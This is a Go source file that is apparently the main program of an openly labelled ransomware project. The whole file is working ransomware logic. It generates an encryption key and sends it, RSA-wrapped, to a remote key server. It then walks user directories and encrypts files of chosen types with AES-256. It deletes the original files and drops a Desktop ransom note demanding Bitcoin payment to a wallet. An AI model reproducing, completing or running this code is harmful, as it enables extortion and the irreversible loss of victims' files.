package main

import (
	"encoding/hex"
	"fmt"
	"io/ioutil"
	"log"
	"net/url"
	"os"
	"path/filepath"
	"sync"
	"time"

	"github.com/mauri870/cryptofile/crypto"
	"github.com/mauri870/ransomware/client"
	"github.com/mauri870/ransomware/cmd"
	"github.com/mauri870/ransomware/rsa"
	"github.com/mauri870/ransomware/utils"
)

var (
	// RSA Public key
	// Automatically injected on autobuild with make
	PUB_KEY = []byte(`INJECT_PUB_KEY_HERE`)

	// Time to keep trying persist new keys on server
	SecondsToTimeout = 5.0
)

func main() {
	// Fun ASCII
	cmd.PrintBanner()

	// Execution locked for windows
	cmd.CheckOS()

	encryptFiles()

	// Wait for enter to exit
	var s string
	fmt.Println("Press enter to quit")
	fmt.Scanf("%s", &s)
}

func encryptFiles() {
	keys := make(map[string]string)
	start := time.Now()
	// Loop creating new keys if server return an validation error
	for {
		// Check for timeout
		if duration := time.Since(start); duration.Seconds() >= SecondsToTimeout {
			log.Println("Timeout reached. Aborting...")
			return
		}

		// Generate the id and encryption key
		keys["id"], _ = utils.GenerateRandomANString(32)
		keys["enckey"], _ = utils.GenerateRandomANString(32)

		// Create the json payload
		payload := fmt.Sprintf(`{"id": "%s", "enckey": "%s"}`, keys["id"], keys["enckey"])

		// Encrypting with RSA-2048
		ciphertext, err := rsa.Encrypt(PUB_KEY, []byte(payload))
		if err != nil {
			log.Println(err)
			continue
		}

		// Call the server to validate and store the keys
		data := url.Values{}
		data.Add("payload", hex.EncodeToString(ciphertext))
		res, err := client.CallServer("POST", "/api/keys/add", data)
		if err != nil {
			log.Println("The server refuse connection. Aborting...")
			return
		}

		// handle possible response statuses
		switch res.StatusCode {
		case 200, 204:
			// \o/
			break
		case 409:
			log.Println("Duplicated ID, trying to generate a new keypair")
			continue
		default:
			log.Printf("An error ocurred, the server respond with status %d\n"+
				" Possible bad encryption or bad json payload\n", res.StatusCode)
			continue
		}

		// Success, proceed
		break
	}

	log.Println("Walking interesting dirs and indexing files...")

	// Loop over the interesting directories
	for _, f := range cmd.InterestingDirs {
		folder := cmd.BaseDir + f
		filepath.Walk(folder, func(path string, f os.FileInfo, err error) error {
			ext := filepath.Ext(path)
			if ext != "" {
				// Matching extensions
				if utils.StringInSlice(ext[1:], cmd.InterestingExtensions) {
					file := cmd.File{FileInfo: f, Extension: ext[1:], Path: path}
					cmd.MatchedFiles = append(cmd.MatchedFiles, file)
					log.Println("Matched:", path)
				}
			}
			return nil
		})
	}

	// Setup a wait group so we can process all files
	var wg sync.WaitGroup

	// Set the number of goroutines we need to wait for while
	// they process the individual files.
	wg.Add(len(cmd.MatchedFiles))

	// Loop over the matched files
	// Launch a goroutine for each file
	for _, file := range cmd.MatchedFiles {
		log.Printf("Encrypting %s...\n", file.Path)

		go func(file cmd.File, wg *sync.WaitGroup) {
			defer wg.Done()

			// Read the file content
			text, err := ioutil.ReadFile(file.Path)
			if err != nil {
				log.Println(err)
				return
			}

			// Encrypting using AES-256-CFB
			ciphertext, err := crypto.Encrypt([]byte(keys["enckey"]), text)
			if err != nil {
				log.Println(err)
				return
			}

			// Write a new file with the encrypted content followed by the custom extension
			err = ioutil.WriteFile(file.Path+cmd.EncryptionExtension, ciphertext, 0600)
			if err != nil {
				log.Println(err)
				return
			}

			// Remove the original file
			err = os.Remove(file.Path)
			if err != nil {
				log.Println("Cannot delete original file, skipping...")
			}
		}(file, &wg)
	}

	// Wait for everything to be processed.
	wg.Wait()

	if len(cmd.MatchedFiles) > 0 {
		message := `
		<pre>
		YOUR FILES HAVE BEEN ENCRYPTED USING A STRONG
		AES-256 ALGORITHM.

		YOUR IDENTIFICATION IS %s

		PLEASE SEND %s TO THE FOLLOWING WALLET

			    %s

		TO RECOVER THE KEY NECESSARY TO DECRYPT YOUR
		FILES
		</pre>
		`
		content := []byte(fmt.Sprintf(message, keys["id"], "0.345 BTC", "XWpXtxrJpSsRx5dICGjUOwkrhIypJKVr"))

		// Write the READ_TO_DECRYPT on Desktop
		ioutil.WriteFile(cmd.BaseDir+"Desktop\\READ_TO_DECRYPT.html", content, 0600)

		log.Println("Done! Don't forget to read the READ_TO_DECRYPT.html file on Desktop")
	}
}
